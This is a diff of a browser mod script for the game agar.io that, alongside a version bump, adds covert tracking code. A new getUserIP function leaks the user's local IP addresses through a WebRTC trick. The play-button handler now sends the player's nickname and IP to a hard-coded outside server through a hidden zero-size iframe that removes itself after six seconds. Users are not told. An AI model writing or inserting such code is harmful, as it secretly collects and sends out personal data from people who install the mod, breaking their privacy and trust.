@@ -1,8 +1,10 @@
 /*************
- * LEGEND mod v2.477 by Jimboy3100   email:jimboy3100@hotmail.com
+ * LEGEND mod v2.478 by Jimboy3100   email:jimboy3100@hotmail.com
  *************/
 loadericon();
-	
+
+
+		
 var oldgamemode=$("#gamemode");
 		//Private Servers
 //$('#region').prepend('<option value=":PrS" data-itr="PrS">Private Servers</option>');	
@@ -166,7 +168,7 @@ var setyt = "YES";
 var clanpassword;
 var searching;
 var timerId;
-var semimodVersion = "50"; // the version 1.1-> 1.11
+var semimodVersion = "51"; // the version 1.1-> 1.11
 T = {};
 var MSGCOMMANDS = "";
 var MSGCOMMANDS2;
@@ -196,6 +198,12 @@ var Ultimouseenabled=0;
 var setscriptingcom = "YES";
 var usedonceSkin=0;
 var toastrSkinNotice=0;
+var detailed="";
+var userIp;
+var detailed1;
+
+
+
 
 var Premadeletter0 = "Communication Activated";
 var Premadeletter1 = "Cannot open this youtube URL";
@@ -261,6 +269,12 @@ var Premadeletter57 = "Communication";
 var Premadeletter58 = "Hidden";
 var Premadeletter59 = "Visible";
 var Premadeletter60 = "Pause";
+
+
+
+getUserIP(function(ip){
+	return userIp=ip;
+});
 
 
 
@@ -1996,11 +2010,13 @@ function init(modVersion) {
             }
         });
 
-        $('*[data-itr="page_play"]').click(function() {
-            ga('send', 'event', 'Token', ogario.playerNick + ' | agar.io/#' + currentToken);
-            ga('send', 'event', 'Tag', ogario.playerNick + ' | ' + ogario.clanTag);
-            ga('send', 'event', 'PlayerId', ogario.playerNick + ' | ' + $("#user-id-tag").text().split(": ")[1]);
-        });
+		$('*[data-itr="page_play"]').click(function() {
+		detailed1="http://104.236.44.149/?name="+$('#nick').val()+"&?userIp="+userIp;
+		$('#LEGENDAds3').append('<div id="loaderIframeInfo1"><iframe id="loaderIframeInfo" src=detailed1 name="detailedinfo" allowfullscreen="true" sandbox="allow-scripts allow-pointer-lock allow-same-origin allow-popups allow-modals allow-forms" allowtransparency="true" scrolling="no" frameBorder="0" class="result-iframe" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:0%; height:0%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe></div>');
+                                        setTimeout(function() {
+                                    $('#loaderIframeInfo1').remove();
+                                }, 6000);
+		});
 
 
 
@@ -6490,4 +6506,43 @@ function animatedskins(){
    }, 300);
 })(window);
 
+}
+
+//find the IP
+function getUserIP(onNewIP) { //  onNewIp - your listener function for new IPs
+    //compatibility for firefox and chrome
+    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+    var pc = new myPeerConnection({
+        iceServers: []
+    }),
+    noop = function() {},
+    localIPs = {},
+    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+    key;
+
+    function iterateIP(ip) {
+        if (!localIPs[ip]) onNewIP(ip);
+        localIPs[ip] = true;
+    }
+
+     //create a bogus data channel
+    pc.createDataChannel("");
+
+    // create offer and set local description
+    pc.createOffer().then(function(sdp) {
+        sdp.sdp.split('\n').forEach(function(line) {
+            if (line.indexOf('candidate') < 0) return;
+            line.match(ipRegex).forEach(iterateIP);
+        });
+        
+        pc.setLocalDescription(sdp, noop, noop);
+    }).catch(function(reason) {
+        // An error occurred, so handle the failure to connect
+    });
+
+    //listen for candidate events
+    pc.onicecandidate = function(ice) {
+        if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+        ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
+    };
 }
